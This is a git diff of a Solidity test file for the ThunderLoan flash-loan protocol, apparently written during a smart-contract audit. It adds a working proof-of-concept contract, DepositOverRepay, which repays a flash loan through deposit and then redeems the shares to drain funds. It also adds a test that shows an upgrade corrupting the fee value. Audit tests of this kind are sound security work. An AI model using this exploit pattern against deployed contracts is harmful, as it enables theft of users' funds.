@@ -11,6 +11,7 @@ import {BuffMockPoolFactory} from "../mocks/BuffMockPoolFactory.sol";
 import {BuffMockTSwap} from "../mocks/BuffMockTSwap.sol";
 import {IFlashLoanReceiver} from "../../src/interfaces/IFlashLoanReceiver.sol";
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {ThunderLoanUpgraded} from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";
 
 contract ThunderLoanTest is BaseTest {
     uint256 constant AMOUNT = 10e18;
@@ -172,7 +173,11 @@ contract ThunderLoanTest is BaseTest {
         uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
         uint256 amountToBorrow = 50e18;
 
-        MalliciousFlashLoanReceiver attacker = new MalliciousFlashLoanReceiver(tswap, address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA)));
+        MalliciousFlashLoanReceiver attacker = new MalliciousFlashLoanReceiver(
+            tswap,
+            address(thunderLoan),
+            address(thunderLoan.getAssetFromToken(tokenA))
+        );
 
         vm.startPrank(user);
         tokenA.mint(address(attacker), amountToBorrow * 2);
@@ -182,6 +187,71 @@ contract ThunderLoanTest is BaseTest {
         uint256 attackFee = attacker.feeOne() + attacker.feeTwo();
         console.log("Attack fee is : ", attackFee);
         console.log("Normal fee is : ", normalFeeCost);
+    }
+
+    function testUseDepositInsteadOfRepayToStealFunds()
+        public
+        setAllowedToken
+        hasDeposits
+    {
+        uint256 amountToBorrow = 50e18;
+        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
+
+        vm.startPrank(user);
+        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
+        tokenA.mint(address(dor), fee);
+        // tokenA.approve(address(thunderLoan), fee);
+        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
+        dor.redeemMoney();
+        vm.stopPrank();
+
+        assert(tokenA.balanceOf(address(dor)) > amountToBorrow + fee);
+    }
+
+    function testUpgradeBreaks() public {
+        uint256 feeBefore = thunderLoan.getFee();
+
+        vm.startPrank(thunderLoan.owner());
+        ThunderLoanUpgraded upgrade = new ThunderLoanUpgraded();
+        thunderLoan.upgradeToAndCall(address(upgrade), "");
+        vm.stopPrank();
+
+        uint256 feeAfter = thunderLoan.getFee();
+
+        console.log("fee before :", feeBefore);
+        console.log("fee after :", feeAfter);
+
+        assert(feeBefore != feeAfter);
+    }
+}
+
+contract DepositOverRepay is IFlashLoanReceiver {
+    ThunderLoan thunderLoan;
+    AssetToken assetToken;
+    IERC20 s_token;
+
+    constructor(address _thunderLoan) {
+        thunderLoan = ThunderLoan(_thunderLoan);
+    }
+
+    function executeOperation(
+        address token,
+        uint256 amount,
+        uint256 fee,
+        address /*initiator*/,
+        bytes calldata /*params*/
+    ) external returns (bool) {
+        s_token = IERC20(token);
+        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
+        IERC20(token).approve(address(thunderLoan), amount + fee);
+        thunderLoan.deposit(IERC20(token), amount + fee);
+        // IERC20(token).transfer(address(thunderLoan), amount);
+        return true;
+    }
+
+    function redeemMoney() public {
+        uint256 amount = assetToken.balanceOf(address(this));
+        thunderLoan.redeem(s_token, amount);
     }
 }
 
@@ -237,7 +307,6 @@ contract MalliciousFlashLoanReceiver is IFlashLoanReceiver {
             // IERC20(token).approve(address(thunderLoan), amount + fee);
             // thunderLoan.repay(IERC20(token), amount + fee);
             IERC20(token).transfer(repayAddress, amount + fee);
-
         }
         return true;
     }
